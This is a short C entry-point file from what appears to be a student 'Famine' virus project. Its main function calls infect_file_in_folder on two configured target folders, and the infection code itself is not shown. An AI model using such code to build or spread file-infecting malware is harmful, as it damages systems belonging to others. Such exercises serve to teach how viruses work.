/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/07/26 12:12:08 by mabouce           #+#    #+#             */
/*   Updated: 2021/07/27 15:36:48 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

int main(void)
{
    int ret;

    if (((ret = infect_file_in_folder(FOLDER_TO_INFECT_ONE)) && ret != ERROR_OPENDIR) ||
        ((ret = infect_file_in_folder(FOLDER_TO_INFECT_TWO)) && ret != ERROR_OPENDIR))
        return ret;
    return 0;
}
